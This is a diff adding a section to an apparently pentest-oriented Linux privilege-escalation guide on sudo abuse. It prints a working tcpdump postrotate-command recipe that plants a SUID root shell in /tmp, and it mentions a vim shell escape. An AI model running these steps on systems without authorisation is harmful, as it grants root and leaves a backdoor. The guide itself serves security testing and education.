@@ -157,6 +157,34 @@ If sudo allows specific arguments (e.g., `sudo /usr/bin/vim /etc/config`):
 - Editor escape still works: `sudo vim /etc/config` → `:!bash`
 - For restricted commands, check if argument injection is possible
 
+### tcpdump — Postrotate-Command Execution (easy to overlook)
+
+A NOPASSWD rule for `tcpdump` reads as "just lets them sniff traffic" and gets
+skipped in favor of a kernel exploit — but it's a GTFOBins root vector even
+when the rule pins specific flags (e.g.
+`(ALL) NOPASSWD: /usr/sbin/tcpdump -w /tmp/*.pcap -ni lo`). tcpdump's
+`-z`/`--postrotate-command` runs an external program as root after each
+capture-file rotation:
+
+```bash
+TF=$(mktemp)
+cat > "$TF" <<'EOF'
+#!/bin/sh
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+EOF
+chmod +x "$TF"
+sudo tcpdump -i lo -G 1 -w /tmp/cap.pcap -z "$TF" -Z root
+# /tmp/rootbash is now a SUID shell: /tmp/rootbash -p
+```
+
+If the sudoers line pins the exact arguments with no trailing wildcard,
+`-z`/`-Z` may not be appendable — check whether the rule allows extra flags
+(a trailing `*`, or `ALL` after the fixed args) before ruling this out.
+Check this before reaching for a kernel exploit (PwnKit, Dirty Pipe, etc.)
+when both are on the table: no build/compile step, no kernel-version
+dependency, so it's faster to confirm and lower-risk to run.
+
 ## Step 3: Sudo Environment Variable Abuse
 
 ### LD_PRELOAD Injection
